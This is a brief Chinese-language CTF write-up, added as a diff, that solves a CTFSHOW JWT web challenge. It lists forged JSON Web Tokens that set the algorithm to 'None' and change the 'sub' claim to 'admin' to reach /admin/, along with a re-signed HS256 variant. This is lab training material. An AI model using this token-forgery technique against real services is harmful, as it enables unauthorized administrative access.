@@ -1,0 +1,29 @@
+### CTFSHOW  - JWT
+
+### web
+
+进入题目可以在cookie中得到这个
+
+```
+eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjU5NDk2ODQsImV4cCI6MTcyNTk1Njg4NCwibmJmIjoxNzI1OTQ5Njg0LCJzdWIiOiJ1c2VyIiwianRpIjoiMDk0NmQ3MDU4OGJmOGY5MTQ3MjYzYWMzODQzZTMzYjcifV0
+```
+
+![image-20240910233241981](https://gitee.com/bx33661/image/raw/master/path/image-20240910233241981.png)
+
+我们需要的是修改"sub"值为admin，同时访问/admin/
+
+```
+eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjU5NDk2ODQsImV4cCI6MTcyNTk1Njg4NCwibmJmIjoxNzI1OTQ5Njg0LCJzdWIiOiJhZG1pbiIsImp0aSI6IjA5NDZkNzA1ODhiZjhmOTE0NzI2M2FjMzg0M2UzM2I3In1d
+```
+
+
+
+```
+eyJhbGciOiJoczI1NiIsInR5cCI6Imp3dCJ9.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjU5NDk2ODQsImV4cCI6MTcyNTk1Njg4NCwibmJmIjoxNzI1OTQ5Njg0LCJzdWIiOiJhZG1pbiIsImp0aSI6IjA5NDZkNzA1ODhiZjhmOTE0NzI2M2FjMzg0M2UzM2I3In1d
+```
+
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6Imp3dCJ9.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjU5NDk2ODQsImV4cCI6MTcyNTk1Njg4NCwibmJmIjoxNzI1OTQ5Njg0LCJzdWIiOiJhZG1pbiIsImp0aSI6IjA5NDZkNzA1ODhiZjhmOTE0NzI2M2FjMzg0M2UzM2I3In1d.1H0lYhYYy_qVcebYwcGFA0AxwXU_ySAW7bvHZXONCZI
+```
+
+![image-20240910145556223](https://gitee.com/bx33661/image/raw/master/path/image-20240910145556223.png)
